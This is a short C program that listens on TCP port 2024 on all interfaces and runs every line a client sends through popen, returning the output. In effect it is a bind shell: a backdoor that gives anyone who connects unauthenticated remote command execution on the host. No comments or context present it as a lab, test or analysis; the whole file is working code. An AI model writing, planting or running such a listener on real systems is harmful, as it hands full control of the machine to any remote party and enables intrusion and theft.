#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 2024
#define BUFFER_SIZE 4096

void process_command(int client_socket) {
    char buffer[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, BUFFER_SIZE); // Clear buffer
        ssize_t bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received < 1) {
            perror("recv");
            break; // Break the loop and close the connection on error or when the client disconnects
        }

        if (strncmp(buffer, "exit", 4) == 0) {
            break; // Exit the loop if command is 'exit'
        }

        // Execute command and send output back
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            printf("Failed to run command\n");
            continue; // Skip to the next command if this one fails
        }

        char command_output[BUFFER_SIZE];
        while (fgets(command_output, sizeof(command_output), fp) != NULL) {
            send(client_socket, command_output, strlen(command_output), 0);
        }

        pclose(fp);
    }
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t sin_len = sizeof(client_addr);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        close(server_socket);
        exit(1);
    }

    listen(server_socket, 1);
    printf("Listening on port %d...\n", PORT);

    while (1) {
        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &sin_len);
        if (client_socket == -1) {
            perror("accept");
            continue;
        }

        printf("Got connection...\n");

        process_command(client_socket);

        close(client_socket);
        printf("Connection closed.\n");
    }
    return 0;
}

